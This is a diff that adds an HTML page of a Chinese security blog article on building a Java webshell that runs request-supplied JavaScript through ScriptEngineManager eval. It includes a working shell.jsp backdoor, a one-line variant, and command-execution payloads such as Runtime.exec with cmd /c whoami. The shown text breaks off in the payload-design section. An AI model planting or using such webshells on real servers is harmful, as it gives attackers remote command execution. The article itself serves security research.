@@ -1,0 +1,1225 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="robots" content="noodp" />
+    <title>一种新型Java一句话木马的实现 - </title><meta name="Description" content="yzddMr6&#39;s Blog"><meta property="og:title" content="一种新型Java一句话木马的实现" />
+<meta property="og:description" content="本文首发于先知社区 1 前言一直以来，Java一句话木马都是采用打入字节码defineClass实现的。这种方法的优势是可以完整的打进去一个类，" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://yzddmr6.com/posts/a-new-type-java-webshell/" /><meta property="og:image" content="https://yzddmr6.com/images/avatar.webp"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2021-06-19T13:05:00+00:00" />
+<meta property="article:modified_time" content="2021-06-19T13:05:00+00:00" /><meta property="og:site_name" content="Hugo DoIt Theme Documentation" />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://yzddmr6.com/images/avatar.webp"/>
+
+<meta name="twitter:title" content="一种新型Java一句话木马的实现"/>
+<meta name="twitter:description" content="本文首发于先知社区 1 前言一直以来，Java一句话木马都是采用打入字节码defineClass实现的。这种方法的优势是可以完整的打进去一个类，"/>
+<meta name="application-name" content="yzddMr6&#39;s Blog">
+<meta name="apple-mobile-web-app-title" content="yzddMr6&#39;s Blog">
+
+<meta name="theme-color" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="https://yzddmr6.com/posts/a-new-type-java-webshell/" /><link rel="prev" href="https://yzddmr6.com/posts/as-exploits-v13-update/" /><link rel="next" href="https://yzddmr6.com/posts/as-exploits-v14-update/" />
+<link rel="stylesheet" href="/css/main.css"><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/color.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/fontawesome-free/all.min.css">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/animate/animate.min.css">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "一种新型Java一句话木马的实现",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/yzddmr6.com\/posts\/a-new-type-java-webshell\/"
+        },"genre": "posts","wordcount":  3940 ,
+        "url": "https:\/\/yzddmr6.com\/posts\/a-new-type-java-webshell\/","datePublished": "2021-06-19T13:05:00+00:00","dateModified": "2021-06-19T13:05:00+00:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
+            "@type": "Organization",
+            "name": "xxxx","logo": {
+                    "@type": "ImageObject",
+                    "url": "https:\/\/yzddmr6.com\/images\/avatar.webp",
+                    "width":  640 ,
+                    "height":  640 
+                }},"author": {
+                "@type": "Person",
+                "name": "yzddMr6"
+            },"description": ""
+    }
+    </script><script src="//instant.page/5.2.0" defer type="module" integrity="sha384-jnZyxPjiipYXnSU0ygqeac2q7CVYMbh84q0uHVRRxEtvFPiQYbXWUorga2aqZJ0z"></script>
+</head>
+
+<body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">
+        function setTheme(theme) {document.body.setAttribute('theme', theme); document.documentElement.style.setProperty('color-scheme', theme === 'light' ? 'light' : 'dark'); window.theme = theme;   window.isDark = window.theme !== 'light' }
+        function saveTheme(theme) {window.localStorage && localStorage.setItem('theme', theme);}
+        function getMeta(metaName) {const metas = document.getElementsByTagName('meta'); for (let i = 0; i < metas.length; i++) if (metas[i].getAttribute('name') === metaName) return metas[i]; return '';}
+        if (window.localStorage && localStorage.getItem('theme')) {let theme = localStorage.getItem('theme');theme === 'light' || theme === 'dark' || theme === 'black' ? setTheme(theme) : (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light')); } else { if ('auto' === 'light' || 'auto' === 'dark' || 'auto' === 'black') setTheme('auto'), saveTheme('auto'); else saveTheme('auto'), window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light');}
+        let metaColors = {'light': '#f8f8f8','dark': '#252627','black': '#000000'}
+        getMeta('theme-color').content = metaColors[document.body.getAttribute('theme')];
+        window.switchThemeEventSet = new Set()
+    </script>
+    <div id="back-to-top"></div>
+    <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="">yzddMr6&#39;s Blog</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> 所有文章 </a><a class="menu-item" href="/tags/"> 标签 </a><a class="menu-item" href="/categories/"> 分类 </a><a class="menu-item" href="/showcase/"> 作品 </a><a class="menu-item" href="/about/"> 关于 </a><a class="menu-item" href="https://github.com/yzddmr6" title="GitHub" rel="noopener noreferrer" target="_blank"><i class='fab fa-github fa-fw'></i>  </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-select" title="切换主题">
+                    <i class="fas fa-adjust fa-fw"></i>
+                    <select class="color-theme-select" id="theme-select-desktop" title="切换主题">
+                        <option value="light">浅色</option>
+                        <option value="dark">深色</option>
+                        <option value="black">黑色</option>
+                        <option value="auto">跟随系统</option>
+                    </select>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="">yzddMr6&#39;s Blog</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        取消
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">所有文章</a><a class="menu-item" href="/tags/" title="">标签</a><a class="menu-item" href="/categories/" title="">分类</a><a class="menu-item" href="/showcase/" title="">作品</a><a class="menu-item" href="/about/" title="">关于</a><a class="menu-item" href="https://github.com/yzddmr6" title="GitHub" rel="noopener noreferrer" target="_blank"><i class='fab fa-github fa-fw'></i></a><a href="javascript:void(0);" class="menu-item theme-select" title="切换主题">
+                <i class="fas fa-adjust fa-fw"></i>
+                <select class="color-theme-select" id="theme-select-mobile" title="切换主题">
+                    <option value="light">浅色</option>
+                    <option value="dark">深色</option>
+                    <option value="black">黑色</option>
+                    <option value="auto">跟随系统</option>
+                </select>
+            </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+            <div class="container"><div class="toc" id="toc-auto">
+        <h2 class="toc-title">目录</h2>
+        <div class="toc-content" id="toc-content-auto"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#前言">前言</a></li>
+    <li><a href="#基本原理">基本原理</a>
+      <ul>
+        <li><a href="#获取脚本引擎">获取脚本引擎</a></li>
+        <li><a href="#绑定对象">绑定对象</a></li>
+        <li><a href="#eval">eval</a></li>
+      </ul>
+    </li>
+    <li><a href="#基本语法">基本语法</a>
+      <ul>
+        <li><a href="#调用java方法">调用Java方法</a></li>
+        <li><a href="#导入java类型">导入Java类型</a></li>
+        <li><a href="#创建java类型的数组">创建Java类型的数组</a></li>
+        <li><a href="#导入java类">导入Java类</a></li>
+        <li><a href="#方法调用与重载">方法调用与重载</a></li>
+      </ul>
+    </li>
+    <li><a href="#payload结构设计">Payload结构设计</a></li>
+    <li><a href="#语法问题的坑">语法问题的坑</a>
+      <ul>
+        <li><a href="#两种语言对象间的相互转换">两种语言对象间的相互转换</a></li>
+        <li><a href="#rhinonashorn解析的差异">Rhino/Nashorn解析的差异</a></li>
+        <li><a href="#反射的坑">反射的坑</a></li>
+      </ul>
+    </li>
+    <li><a href="#保底操作">保底操作</a></li>
+    <li><a href="#测试">测试</a></li>
+    <li><a href="#最后">最后</a>
+      <ul>
+        <li><a href="#heading"></a></li>
+        <li><a href="#heading-1"></a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+    </div><script>document.getElementsByTagName("main")[0].setAttribute("autoTOC", "true")</script><article class="page single"><h1 class="single-title animate__animated animate__flipInX">一种新型Java一句话木马的实现</h1><div class="post-meta">
+            <div class="post-meta-line">
+                <span class="post-author"><span class="author fas fa-user-circle fa-fw"></span><a href="https://github.com/yzddmr6" title="Author" target="_blank" rel="noopener noreferrer author" class="author">yzddMr6</a>
+                </span>&nbsp;<span class="post-category">收录于 </span>&nbsp;<span class="post-category">类别 <a href="/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E7%AB%A0/"><i class="far fa-folder fa-fw"></i>技术文章</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2021-06-19">2021-06-19</time>&nbsp;<i class="far fa-edit fa-fw"></i>&nbsp;<time datetime="2021-06-19">2021-06-19</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 3940 字&nbsp;<i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 8 分钟&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  kept="">
+                <div class="details-summary toc-title">
+                    <span>目录</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#前言">前言</a></li>
+    <li><a href="#基本原理">基本原理</a>
+      <ul>
+        <li><a href="#获取脚本引擎">获取脚本引擎</a></li>
+        <li><a href="#绑定对象">绑定对象</a></li>
+        <li><a href="#eval">eval</a></li>
+      </ul>
+    </li>
+    <li><a href="#基本语法">基本语法</a>
+      <ul>
+        <li><a href="#调用java方法">调用Java方法</a></li>
+        <li><a href="#导入java类型">导入Java类型</a></li>
+        <li><a href="#创建java类型的数组">创建Java类型的数组</a></li>
+        <li><a href="#导入java类">导入Java类</a></li>
+        <li><a href="#方法调用与重载">方法调用与重载</a></li>
+      </ul>
+    </li>
+    <li><a href="#payload结构设计">Payload结构设计</a></li>
+    <li><a href="#语法问题的坑">语法问题的坑</a>
+      <ul>
+        <li><a href="#两种语言对象间的相互转换">两种语言对象间的相互转换</a></li>
+        <li><a href="#rhinonashorn解析的差异">Rhino/Nashorn解析的差异</a></li>
+        <li><a href="#反射的坑">反射的坑</a></li>
+      </ul>
+    </li>
+    <li><a href="#保底操作">保底操作</a></li>
+    <li><a href="#测试">测试</a></li>
+    <li><a href="#最后">最后</a>
+      <ul>
+        <li><a href="#heading"></a></li>
+        <li><a href="#heading-1"></a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><meta name="referrer" content="no-referrer" />
+<blockquote>
+<p>本文首发于先知社区</p>
+</blockquote>
+<h2 id="前言" class="headerLink">
+    <a href="#%e5%89%8d%e8%a8%80" class="header-mark"></a>1 前言</h2><p>一直以来，Java一句话木马都是采用打入字节码defineClass实现的。这种方法的优势是可以完整的打进去一个类，可以几乎实现Java上的所有功能。不足之处就是Payload过于巨大，并且不像脚本语言一样方便修改。并且还存在很多特征，例如继承ClassLoader，反射调用defineClass等。本人在这里提出一种新型Java一句话木马：利用Java中JS引擎实现的一句话木马。</p>
+<h2 id="基本原理" class="headerLink">
+    <a href="#%e5%9f%ba%e6%9c%ac%e5%8e%9f%e7%90%86" class="header-mark"></a>2 基本原理</h2><ol>
+<li>Java没有eval函数，Js有eval函数，可以把字符串当代码解析。</li>
+<li>Java从1.6开始自带ScriptEngineManager这个类，原生支持调用js，无需安装第三方库。</li>
+<li>ScriptEngine支持在Js中调用Java的对象。</li>
+</ol>
+<p>综上所述，我们可以利用Java调用JS引擎的eval，然后在Payload中反过来调用Java对象，这就是本文提出的新型Java一句话的核心原理。</p>
+<p>ScriptEngineManager全名javax.script.ScriptEngineManager，从Java 6开始自带。其中Java 6/7采用的js解析引擎是Rhino，而从java8开始换成了Nashorn。不同解析引擎对同样的代码有一些差别，这点后面有所体现。</p>
+<p>如果说原理其实一两句话就可以说清楚，但是难点在于Payload的编写。跨语言调用最大的一个难点就是数据类型以及方法的转换。例如Java中有byte数组，Js中没有怎么办？C++里有指针但是Java里没有这个玩意怎么办？</p>
+<p>在实现期间踩了很多的坑，这篇文章跟大家一起掰扯掰扯，希望能给大家提供点帮助。</p>
+<h3 id="获取脚本引擎" class="headerLink">
+    <a href="#%e8%8e%b7%e5%8f%96%e8%84%9a%e6%9c%ac%e5%bc%95%e6%93%8e" class="header-mark"></a>2.1 获取脚本引擎</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">//通过脚本名称获取：
+</span></span><span class="line"><span class="cl">ScriptEngine engine = new ScriptEngineManager().getEngineByName(&#34;JavaScript&#34;);  //简写为js也可以
+</span></span><span class="line"><span class="cl">//通过文件扩展名获取： 
+</span></span><span class="line"><span class="cl">ScriptEngine engine = new ScriptEngineManager().getEngineByExtension(&#34;js&#34;);  
+</span></span><span class="line"><span class="cl">//通过MIME类型来获取： 
+</span></span><span class="line"><span class="cl">ScriptEngine engine = new ScriptEngineManager().getEngineByMimeType(&#34;text/javascript&#34;);  
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="绑定对象" class="headerLink">
+    <a href="#%e7%bb%91%e5%ae%9a%e5%af%b9%e8%b1%a1" class="header-mark"></a>2.2 绑定对象</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ScriptEngine engine = new ScriptEngineManager().getEngineByName(&#34;js&#34;);
+</span></span><span class="line"><span class="cl">engine.put(&#34;request&#34;, request);
+</span></span><span class="line"><span class="cl">engine.put(&#34;response&#34;, response);
+</span></span><span class="line"><span class="cl">engine.eval(request.getParameter(&#34;mr6&#34;));
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>或者通过eval的重载函数，直接把对象通过一个HashMap放进去</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">new javax.script.ScriptEngineManager().getEngineByName(&#34;js&#34;).eval(request.getParameter(&#34;ant&#34;), new javax.script.SimpleBindings(new java.util.HashMap() {{
+</span></span><span class="line"><span class="cl">put(&#34;response&#34;, response);
+</span></span><span class="line"><span class="cl">put(&#34;request&#34;, request);
+</span></span><span class="line"><span class="cl">}}))
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="eval" class="headerLink">
+    <a href="#eval" class="header-mark"></a>2.3 eval</h3><p>综合上面两步，有很多种写法，例如：</p>
+<p>shell.jsp</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;%
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">     javax.script.ScriptEngine engine = new javax.script.ScriptEngineManager().getEngineByName(&#34;js&#34;);
+</span></span><span class="line"><span class="cl">     engine.put(&#34;request&#34;, request);
+</span></span><span class="line"><span class="cl">     engine.put(&#34;response&#34;, response);
+</span></span><span class="line"><span class="cl">     engine.eval(request.getParameter(&#34;mr6&#34;));
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">%&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>或者直接缩写成一句：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;%
+</span></span><span class="line"><span class="cl">     new javax.script.ScriptEngineManager().getEngineByName(&#34;js&#34;).eval(request.getParameter(&#34;mr6&#34;), new javax.script.SimpleBindings(new java.util.HashMap() {{
+</span></span><span class="line"><span class="cl">            put(&#34;response&#34;, response);
+</span></span><span class="line"><span class="cl">            put(&#34;request&#34;, request);
+</span></span><span class="line"><span class="cl">        }}));
+</span></span><span class="line"><span class="cl">%&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>以执行命令为例：</p>
+<p>POST：mr6=java.lang.Runtime.getRuntime().exec(&ldquo;calc&rdquo;);</p>
+<p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623115889123-4cbb0baf-c699-4f3a-b1ca-311ea0293937.png" title="image.png" data-thumbnail="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623115889123-4cbb0baf-c699-4f3a-b1ca-311ea0293937.png">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623115889123-4cbb0baf-c699-4f3a-b1ca-311ea0293937.png"
+            srcset="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623115889123-4cbb0baf-c699-4f3a-b1ca-311ea0293937.png, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623115889123-4cbb0baf-c699-4f3a-b1ca-311ea0293937.png 1.5x, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623115889123-4cbb0baf-c699-4f3a-b1ca-311ea0293937.png 2x"
+            sizes="auto"
+            alt="image.png">
+    </a></figure></p>
+<p>即可达到命令执行的效果。</p>
+<h2 id="基本语法" class="headerLink">
+    <a href="#%e5%9f%ba%e6%9c%ac%e8%af%ad%e6%b3%95" class="header-mark"></a>3 基本语法</h2><p>翻阅文档比较枯燥，这里挑一些用到的说一说。</p>
+<p>感兴趣的同学也可以看一下原文档：https://docs.oracle.com/en/java/javase/12/scripting/java-scripting-programmers-guide.pdf</p>
+<h3 id="调用java方法" class="headerLink">
+    <a href="#%e8%b0%83%e7%94%a8java%e6%96%b9%e6%b3%95" class="header-mark"></a>3.1 调用Java方法</h3><p>前面加上全限定类名即可</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">var s = [3];
+</span></span><span class="line"><span class="cl">s[0] = &#34;cmd&#34;;
+</span></span><span class="line"><span class="cl">s[1] = &#34;/c&#34;;
+</span></span><span class="line"><span class="cl">s[2] = &#34;whoami&#34;;//yzddmr6
+</span></span><span class="line"><span class="cl">var p = java.lang.Runtime.getRuntime().exec(s);
+</span></span><span class="line"><span class="cl">var sc = new java.util.Scanner(p.getInputStream(),&#34;GBK&#34;).useDelimiter(&#34;\\A&#34;);
+</span></span><span class="line"><span class="cl">var result = sc.hasNext() ? sc.next() : &#34;&#34;;
+</span></span><span class="line"><span class="cl">sc.close();
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="导入java类型" class="headerLink">
+    <a href="#%e5%af%bc%e5%85%a5java%e7%b1%bb%e5%9e%8b" class="header-mark"></a>3.2 导入Java类型</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">var Vector = java.util.Vector;
+</span></span><span class="line"><span class="cl">var JFrame = Packages.javax.swing.JFrame;
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl"> //这种写法仅仅支持Nashorn，Rhino并不支持
+</span></span><span class="line"><span class="cl">var Vector = Java.type(&#34;java.util.Vector&#34;)
+</span></span><span class="line"><span class="cl">var JFrame = Java.type(&#34;javax.swing.JFrame&#34;)
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="创建java类型的数组" class="headerLink">
+    <a href="#%e5%88%9b%e5%bb%bajava%e7%b1%bb%e5%9e%8b%e7%9a%84%e6%95%b0%e7%bb%84" class="header-mark"></a>3.3 创建Java类型的数组</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">// Rhino
+</span></span><span class="line"><span class="cl">var Array = java.lang.reflect.Array
+</span></span><span class="line"><span class="cl">var intClass = java.lang.Integer.TYPE
+</span></span><span class="line"><span class="cl">var array = Array.newInstance(intClass, 8)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">// Nashorn
+</span></span><span class="line"><span class="cl">var IntArray = Java.type(&#34;int[]&#34;)
+</span></span><span class="line"><span class="cl">var array = new IntArray(8)
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="导入java类" class="headerLink">
+    <a href="#%e5%af%bc%e5%85%a5java%e7%b1%bb" class="header-mark"></a>3.4 导入Java类</h3><p>默认情况下，Nashorn 不会导入Java的包。这样主要为了避免类型冲突，比如你写了一个new String，引擎怎么知道你new的是Java的String还是js的String？所以所有的Java的调用都需要加上全限定类名。但是这样写起来很不方便。</p>
+<p>这个时候大聪明Mozilla  Rhino 就想了一个办法，整了个扩展文件，里面提供了importClass 跟importPackage 方法，可以导入指定的Java包。</p>
+<ul>
+<li>importClass 导入指定Java的类，现在推荐用Java.type</li>
+<li>importPackage 导入一个Java包，类似import com.yzddmr6.*，现在推荐用JavaImporter</li>
+</ul>
+<p>这里需要注意的是，Rhino对该语法的错误处理机制，当被访问的类存在时，Rhino加载该class，而当其不存在时，则把它当成package名称，而并不会报错。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">load(&#34;nashorn:mozilla_compat.js&#34;);
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">importClass(java.util.HashSet);
+</span></span><span class="line"><span class="cl">var set = new HashSet();
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">importPackage(java.util);
+</span></span><span class="line"><span class="cl">var list = new ArrayList();
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>在一些特殊情况下，导入的全局包会影响js中的函数，例如类名冲突。这个时候可以用JavaImporter，并配合with语句，对导入的Java包设定一个使用范围。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">// create JavaImporter with specific packages and classes to import
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">var SwingGui = new JavaImporter(javax.swing,
+</span></span><span class="line"><span class="cl">                            javax.swing.event,
+</span></span><span class="line"><span class="cl">                            javax.swing.border,
+</span></span><span class="line"><span class="cl">                            java.awt.event);
+</span></span><span class="line"><span class="cl">with (SwingGui) {
+</span></span><span class="line"><span class="cl">    // 在with里面才可以调用swing里面的类，防止污染
+</span></span><span class="line"><span class="cl">    var mybutton = new JButton(&#34;test&#34;);
+</span></span><span class="line"><span class="cl">    var myframe = new JFrame(&#34;test&#34;);
+</span></span><span class="line"><span class="cl">}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="方法调用与重载" class="headerLink">
+    <a href="#%e6%96%b9%e6%b3%95%e8%b0%83%e7%94%a8%e4%b8%8e%e9%87%8d%e8%bd%bd" class="header-mark"></a>3.5 方法调用与重载</h3><p>方法在JavaScript中实际上是对象的一个属性，所以除了使用 . 来调用方法之外，也可以使用[]来调用方法：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">var System = Java.type(&#39;java.lang.System&#39;);
+</span></span><span class="line"><span class="cl">System.out.println(&#39;Hello, World&#39;);    // Hello, World
+</span></span><span class="line"><span class="cl">System.out[&#39;println&#39;](&#39;Hello, World&#39;); // Hello, World
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Java支持重载（Overload）方法，例如，System.out 的 println 有多个重载版本，如果你想指定特定的重载版本，可以使用[]指定参数类型。例如：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">var System = Java.type(&#39;java.lang.System&#39;);
+</span></span><span class="line"><span class="cl">System.out[&#39;println&#39;](3.14);          // 3.14
+</span></span><span class="line"><span class="cl">System.out[&#39;println(double)&#39;](3.14);  // 3.14
+</span></span><span class="line"><span class="cl">System.out[&#39;println(int)&#39;](3.14);     // 3
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="payload结构设计" class="headerLink">
+    <a href="#payload%e7%bb%93%e6%9e%84%e8%ae%be%e8%ae%a1" class="header-mark"></a>4 Payload结构设计</h2><p>详情写在注释里了</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
